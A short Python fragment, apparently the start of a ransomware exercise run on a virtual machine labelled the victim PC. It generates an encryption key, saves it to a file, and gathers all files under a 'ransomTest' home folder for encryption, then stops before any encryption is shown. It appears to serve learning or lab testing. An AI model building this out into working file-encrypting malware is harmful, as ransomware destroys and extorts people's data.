#####VM part, Victim PC#####

from cryptography.fernet import Fernet
import os
import glob

homeDir = os.path.expanduser('~') #grabs user home directory
key = Fernet.generate_key()

with open("secret.key", "wb") as Enc_key:
    Enc_key.write(key)

files = glob.glob(f'{homeDir}\\ransomTest\\**\\*.*', recursive=True) #grabs files we want to enc
print(homeDir)
